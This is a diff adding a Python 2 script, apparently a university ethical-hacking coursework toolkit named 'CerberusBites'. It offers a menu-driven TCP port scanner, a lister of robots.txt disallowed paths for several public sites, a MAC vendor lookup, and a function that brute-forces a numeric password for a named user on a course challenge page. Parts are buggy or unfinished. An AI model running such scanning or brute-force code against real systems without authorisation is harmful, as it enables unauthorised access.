@@ -1,0 +1,153 @@
+#!/usr/bin/env python
+
+#########################################################################
+# CerberusBites V0.00001 Developed for Diamond House Inc. by The Lead Developer #
+#########################################################################
+
+# Some of these might need to be installed on the system seperately:
+import socket
+import requests
+import subprocess
+import robotparser
+import logging
+# Features to be added: Extending the function to scan three of the most common ports (HTTP, FTP, SSH)
+
+def scanport(host,ports):
+#    print "##############################################################"
+  #  print "#                                                            #"
+#    print "#                       Portscannerv3                        #"
+ #   print "#                                                            #"
+  #  print "##############################################################"
+
+  #  print ("This basic portscanner will scan commonly vulnerable ports.")
+  #  print (" ")
+    host = raw_input("Please Enter Target IP Address: ")
+    ports = {"20":"FTP","21":"FTP","22":"SSH","23":"Telnet","25":"SMTP","53":"DNS","67":"BOOTPS(DHCP)",
+    "67":"BOOTPC(DHCP)","69":"TFTP","79":"FINGER","80":"HTTP","110":"POP3","119":"NNTP","139":"netbios-ssn","143":"imap","161":"SNMP",
+    "162":"SNMP","443":"HTTPS","445":"netbios-ssn","514":"remote shell","993":"ssl/imap","995":"ssl/pop3","3306":"mysql","8080":"HTTP"}
+
+    def scanport(host, port):
+        s = socket.socket()
+        try:
+            s.connect((host,port))
+        except socket.error:
+            s.close()
+            return False
+        s.close()
+        return True
+
+    #if __name__ == "__main__":
+    for port in range(20,444):
+        if scanport(host, port):
+            print(ports[str(port)],port," Open")
+           
+
+
+# Still a bit buggy, needs a bit of tweaking........
+
+def crackhouse():
+    """Bruteforce the password for titanium house"""
+
+    for item in range(999):
+        params = {"username":"JoeSmith", "password":item}
+        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php",
+                         params = params)
+        if r.text.find("incorrect") >= 0:
+            print "Fails on {0}".format(item)
+        else:
+            print "Passcode {0} Ok".format(item)
+            return item
+
+
+
+# Something eye catching/fun but in the same time usable would be perfect here. (CowSay?)
+
+def amazingMenu():
+    print ('CerberusBites')
+    print ("Menu System v0.00001")  
+    ipt = None #Tempary stoarace for input
+    while ipt != "Q" and ipt != "q":
+        print ("Press 1 for Crackhouse")
+        print ("Press 2 for RobotParser")
+        print ("Press 3 for port scanner")
+        print ("Press 4 to generate a report")
+        print ("Press 5 for identifying the device with the specified MAC address")
+        print ("Press Q to quit")
+        ipt = raw_input("Enter Choice> ")
+        if ipt == "1":
+            crackhouse()
+        if ipt == "banner":
+            print banner
+        if ipt == "2":
+            listRestricted()
+        if ipt == "3":
+            scanport("0", "0")
+        if ipt == "4":
+            generateReport()
+        if ipt == "5":
+            identifyOUI("0")
+    
+
+
+
+#This needs a bit more tweaking to get it working:
+
+def listRestricted():
+    """ Return the restricted folders from a webpage based on the robots.txt file. """
+    sites = ['www.google.com','www.coventry.ac.uk', 'www.yahoo.com']
+    
+    def getDenies(site):
+        """ Create a new robotparser instance and read the site's robots file"""
+        paths =[]
+        robot = robotparser.RobotFileParser()
+        robot.set_url("http://"+site+"/robots.txt")
+        robot.read()        
+        # For each entry, look at the rule lines and add the path to paths if disallowed.
+        for line in robot.default_entry.rulelines:
+           # for line in entry.default.rulelines:
+                not line.allowance and paths.append(line.path)
+        return set(paths)
+
+    for site in sites:
+        print "Denies for"+site
+        print "\t" + "\n\t".join(getDenies(site))
+        
+
+def identifyOUI(macaddress):
+    """This function should identify the manufacturer of a given device based on its MAC adress"""
+    # Load the Wireshark manufacturers database file from the disk and  search through it to return the manufacturer
+    macaddress = raw_input("Type the mac address of the device you want identified:")
+    database = open("data.txt", "r")
+    for line in database:
+        if macaddress in line: print line
+    database.close()
+
+
+def generateReport():
+    """This function should take all the output from the selected tunctionality and save it to a file of some sort."""
+    
+    listRestricted()
+    #print scanport()
+    crackhouse()
+    identifyOUI("0")
+    
+    logging.basicConfig(level=logging.DEBUG, filename="logfile.txt", filemode="a+",
+                        format="%(asctime)-15s %(levelname)-8s %(message)s")
+    logging.info("##########################")
+    logging.info("###### OUTPUT #####")
+    logging.info("##########################")
+
+
+    
+
+# Below I can test all the custom functionality that I am writing, just by calling the function
+
+if __name__ == "__main__":
+    amazingMenu()
+    #listRestricted()
+    #identifyOUI("A4:18:75")
+    #print scanport("127.0.0.1",8000)
+    #print crackhouse()
+    #print listrestricted
+    raw_input()
+
